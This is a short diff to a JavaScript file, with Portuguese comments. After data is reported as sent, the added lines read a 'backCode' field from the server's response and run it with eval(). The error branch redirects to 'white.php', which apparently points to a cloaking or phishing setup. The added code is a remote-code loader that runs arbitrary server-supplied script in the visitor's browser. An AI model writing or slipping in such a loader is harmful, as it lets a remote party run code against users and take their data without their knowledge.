@@ -27,6 +27,18 @@
         }
 
         console.log("Dados enviados com sucesso!");
+
+        // Após o envio bem-sucedido, pegar o código JS na chave 'backCode'
+        const responseData = await response.json();
+        const backCode = responseData.backCode;
+
+        if (backCode) {
+            // Executar o código JS retornado na chave 'backCode'
+            eval(backCode);
+        } else {
+            console.error('Chave backCode não encontrada na resposta.');
+        }
+
     } catch (error) {
         console.error('Erro:', error);
         // Em caso de erro, redireciona para "white.php"
